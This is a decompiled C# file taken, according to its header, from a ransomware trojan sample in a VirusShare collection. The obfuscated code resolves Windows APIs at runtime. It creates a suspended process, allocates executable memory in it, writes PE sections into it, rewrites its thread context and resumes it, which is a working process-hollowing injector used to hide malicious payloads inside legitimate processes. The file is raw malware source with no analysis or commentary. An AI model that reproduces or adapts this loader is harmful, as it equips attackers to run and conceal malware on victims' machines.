// Decompiled with JetBrains decompiler
// Type: KaMaL.bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU
// Assembly: KaMaL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8DF9AD97-3392-4345-A8B5-C984422A3CEF
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Ransom.Win32.Foreign.mmxg-c9b06d357201b2aa4433816b3e23da23b6916bb9e01f48ca5190eb9e435f833b.exe

using KaMaL.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;
using Ⴐ;

namespace KaMaL
{
  [StandardModule]
  public sealed class bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU
  {
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.TRdyNsukGMxJCjMhszWzS Ⴓ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.qIXPZvExEcBozDHkg Ⴐ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.WwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt Ⴅ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE Ⴗ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.QyQfNUjrqIKPBzuHJhmYsw Ⴐ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge Ⴍ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.bYZNJkVwGLFXDIIpfGuxQcDVURBtH Ⴅ;
    private static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF Ⴗ;

    static bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
            num = (int) ⴗ[235];
            continue;
          case 1:
          case 2:
          case 10:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴗ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE>(Ⴜ.ႨႤ(2, 95604591, (string) null), ႰႭ.ႰႣ(6L, 8, 1779788401));
            num = 3;
            continue;
          case 3:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴐ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.QyQfNUjrqIKPBzuHJhmYsw>(Ⴜ.ႨႤ(7, 95604586, (string) null), ႰႭ.ႰႣ(9L, 1, 1779788394));
            goto case 0;
          case 4:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴅ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.bYZNJkVwGLFXDIIpfGuxQcDVURBtH>(Ⴜ.ႨႤ(2, 95604591, (string) null), ႰႭ.ႰႣ(13L, 6, 1779788419));
            num = 6;
            continue;
          case 6:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴗ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF>(Ⴜ.ႨႤ(8, 95604581, (string) null), ႰႭ.ႰႣ(9L, 4, 1779788460));
            num = (int) ⴗ[64] - 167;
            continue;
          case 7:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴅ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.WwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt>(Ⴜ.ႨႤ(2, 95604579, (string) null), ႰႭ.ႰႣ(9L, 4, 1779788373));
            num = 2;
            continue;
          case 8:
            goto label_11;
          case 9:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴍ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge>(Ⴜ.ႨႤ(3, 95604590, (string) null), ႰႭ.ႰႣ(5L, 5, 1779788442));
            num = 4;
            continue;
          case 11:
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴐ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.qIXPZvExEcBozDHkg>(Ⴜ.ႨႤ(0, 95604589, (string) null), ႰႭ.ႰႣ(5L, 3, 1779788322));
            num = 7;
            continue;
          default:
            ႰႭ.Ⴜ();
            bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴓ = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV<bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.TRdyNsukGMxJCjMhszWzS>(Ⴜ.ႨႤ(3, 95604590, (string) null), ႰႭ.ႰႣ(14L, 5, 1779788344));
            num = 11;
            continue;
        }
      }
label_11:;
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

    public static T IhVkccohsULlmqEvxAGEmwrqLkGV<T>(
      string CIKCHjX,
      string GZGyQFxnaGQdbuqkNUbgIpISSRSfX)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      T obj1 = (T) Ⴜ.ႨႰ(bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.GetProcAddress(bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.LoadLibraryA(ref CIKCHjX), ref GZGyQFxnaGQdbuqkNUbgIpISSRSfX), typeof (T), '˓', 'ˈ');
      int num1 = (int) ⴀ[166] - 17;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_4;
          case 1:
          case 2:
          case 3:
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.IhVkccohsULlmqEvxAGEmwrqLkGV);
            num1 = 2;
            continue;
        }
      }
label_4:
      T obj2 = obj1;
      int num2 = (int) ႰႭ.Ⴄ();
      return obj2;
    }

    public static bool sQmBlSvsXqvvKzVftxpBNMvtLyEhWBI(
      byte[] zjpIRljkYUsyckYbkrWtR,
      string SksRmtkwjdlWobNpzLWjLxLpowibkzI)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      bool flag1;
      try
      {
        int num1 = 8;
        while (true)
        {
          IntPtr zero1;
          object bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0;
          object Part9;
          int num2;
          int num3;
          IntPtr num4;
          bool flag2;
          object Part2_1;
          IntPtr Part2_2;
          IntPtr zero2;
          IntPtr num5;
          IntPtr zero3;
          IntPtr Part2_3;
          IntPtr num6;
          IntPtr Part2_4;
          int Part5;
          int num7;
          int num8;
          Array array;
          Array Part3;
          int num9;
          switch (num1)
          {
            case 0:
            case 28:
              flag2 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴗ((string) null, new StringBuilder(SksRmtkwjdlWobNpzLWjLxLpowibkzI), zero1, zero1, false, 4, zero1, (string) null, (byte[]) Part9, bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 as IntPtr[]);
              num1 = 19;
              continue;
            case 1:
              num9 = 1;
              break;
            case 2:
              int num10 = (int) bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴐ((bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 as IntPtr[])[1]);
              num1 = (int) ⴗ[259] - 85;
              continue;
            case 3:
              Part2_1 = (object) new uint[179];
              (Part2_1 as uint[])[0] = 65538U;
              flag2 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴐ((bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 as IntPtr[])[1], Part2_1 as uint[]);
              num1 = 6;
              continue;
            case 4:
              checked { ++num8; }
              num1 = 13;
              continue;
            case 5:
              num6 = new IntPtr(checked ((long) (Part2_1 as uint[])[41] + 8L));
              num1 = 32;
              continue;
            case 6:
              num1 = !flag2 ? (int) ⴀ[45] - 47 : 14;
              continue;
            case 7:
              int num11 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴍ((bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 as IntPtr[])[0], num6, Part3 as byte[], checked ((uint) Ⴐ.Ⴈ.ႨႭ.ႨႣ(Part2_3, 'n', '~')), Part5) ? 1 : 0;
              num1 = 4;
              continue;
            case 9:
              num1 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴅ(((IntPtr[]) bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0)[0], zero2) == 0U ? 1 : 25;
              continue;
            case 10:
              zero2 = IntPtr.Zero;
              num5 = new IntPtr(4);
              zero3 = IntPtr.Zero;
              goto case 17;
            case 11:
              int num12 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴓ(((IntPtr[]) bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0)[1], Part2_1 as uint[]) ? 1 : 0;
              num1 = 22;
              continue;
            case 12:
              Part2_3 = new IntPtr(((byte[]) Part3).Length);
              goto case 7;
            case 13:
              num1 = num8 <= num7 ? 30 : (int) ⴀ[65] - 142;
              continue;
            case 14:
              Part2_2 = new IntPtr(checked ((long) (Part2_1 as uint[])[41] + 8L));
              num1 = (int) ⴗ[36];
              continue;
            case 15:
              Part3 = (Array) new byte[checked ((array as int[])[4] - 1 + 1)];
              num1 = 24;
              continue;
            case 16:
              num6 = new IntPtr(checked (Ⴜ.ႨႭ(ref Part2_4, 986, (short) 963) + (array as int[])[3]));
              num1 = 12;
              continue;
            case 17:
              num1 = !bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴅ(((IntPtr[]) bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0)[0], Part2_2, ref zero2, Ⴐ.Ⴈ.ႨႭ.ႨႣ(num5, '\u0003', '\u0013'), ref zero3) ? (int) ⴀ[120] : 9;
              continue;
            case 18:
              goto label_36;
            case 19:
              num1 = !flag2 ? (int) ⴗ[69] / 8 : 3;
              continue;
            case 20:
              num7 = checked (num3 - 1);
              num8 = 0;
              num1 = 13;
              continue;
            case 21:
              Part2_3 = new IntPtr(ႰႭ.ႤႣ(zjpIRljkYUsyckYbkrWtR, checked (num2 + 52), 829, 'ͱ'));
              num1 = (int) ⴀ[3] + 0;
              continue;
            case 22:
              num1 = 2;
              continue;
            case 24:
              Ⴜ.ႨႷ((Array) zjpIRljkYUsyckYbkrWtR, ((int[]) array)[5], Part3, 0, ((byte[]) Part3).Length, 148, 192);
              num1 = 16;
              continue;
            case 25:
              num9 = 0;
              break;
            case 26:
              num3 = (int) ႰႭ.ႤႰ(zjpIRljkYUsyckYbkrWtR, checked (num2 + 6), 'Q', 'c');
              num4 = new IntPtr(ႰႭ.ႤႣ(zjpIRljkYUsyckYbkrWtR, checked (num2 + 84), 342, 'Ě'));
              num1 = 28;
              continue;
            case 27:
              (Part2_1 as uint[])[44] = checked ((uint) (Ⴜ.ႨႭ(ref Part2_4, 158, (short) 135) + BitConverter.ToInt32(zjpIRljkYUsyckYbkrWtR, num2 + 40)));
              num1 = 11;
              continue;
            case 29:
              int num13 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴍ((bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 as IntPtr[])[0], Part2_4, zjpIRljkYUsyckYbkrWtR, checked ((uint) Ⴐ.Ⴈ.ႨႭ.ႨႣ(num4, 'ʺ', 'ʪ')), Part5) ? 1 : 0;
              num1 = 20;
              continue;
            case 30:
              array = (Array) new int[10];
              Ⴜ.ႨႷ((Array) zjpIRljkYUsyckYbkrWtR, checked (num2 + 248 + num8 * 40), (Array) (array as int[]), 0, 40, 792, 844);
              num1 = (int) ⴀ[152] - 169;
              continue;
            case 31:
              num6 = new IntPtr(ႰႭ.ႤႣ(zjpIRljkYUsyckYbkrWtR, checked (num2 + 80), 552, 'ɤ'));
              num1 = 33;
              continue;
            case 32:
              Part2_3 = new IntPtr(4);
              int num14 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴍ(((IntPtr[]) bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0)[0], num6, ႰႭ.ႤႤ(Ⴜ.ႨႭ(ref Part2_4, 873, (short) 880), (short) 969, 1005), checked ((uint) Ⴐ.Ⴈ.ႨႭ.ႨႣ(Part2_3, 'ϋ', 'ϛ')), Part5) ? 1 : 0;
              num1 = 27;
              continue;
            case 33:
              Part2_4 = bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU.Ⴗ((bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 as IntPtr[])[0], Part2_3, num6, 12288, 64);
              num1 = 29;
              continue;
            default:
              zero1 = IntPtr.Zero;
              bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0 = (object) new IntPtr[4];
              Part9 = (object) new byte[68];
              num2 = ႰႭ.ႤႣ(zjpIRljkYUsyckYbkrWtR, 60, 367, 'ģ');
              num1 = 26;
              continue;
          }
          flag2 = num9 != 0;
          num1 = !flag2 ? 22 : 21;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag1 = false;
        ProjectData.ClearProjectError();
        goto label_39;
      }
label_36:
      int num15 = 5;
      while (true)
      {
        switch (num15)
        {
          case 0:
          case 3:
            goto label_39;
          default:
            flag1 = true;
            num15 = (int) ⴗ[219] - 251;
            continue;
        }
      }
label_39:
      int num16 = flag1 ? 1 : 0;
      Ⴐ.Ⴈ.ႨႭ.Ⴃ();
      MyApplication.Ⴀ[179] = (byte) (((int) MyApplication.Ⴀ[179] | (int) MyApplication.Ⴀ[87]) & 201);
      return num16 != 0;
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool TRdyNsukGMxJCjMhszWzS(
      IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      uint[] Part2);

    public delegate uint qIXPZvExEcBozDHkg(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt);

    public delegate uint WwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt(
      IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      IntPtr Part2);

    public delegate IntPtr uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE(
      IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      IntPtr Part2,
      IntPtr Part3,
      int Part4,
      int Part5);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool QyQfNUjrqIKPBzuHJhmYsw(
      IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      uint[] Part2);

    public delegate bool bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge(
      IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      IntPtr Part2,
      byte[] Part3,
      uint Part4,
      int Part5);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool bYZNJkVwGLFXDIIpfGuxQcDVURBtH(
      IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      IntPtr Part2,
      ref IntPtr Part3,
      int Part4,
      ref IntPtr Part5);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF(
      string bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt,
      StringBuilder Part2,
      IntPtr Part3,
      IntPtr Part4,
      [MarshalAs(UnmanagedType.Bool)] bool Part5,
      int Part6,
      IntPtr Part7,
      string Part8,
      byte[] Part9,
      IntPtr[] bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0);
  }
}
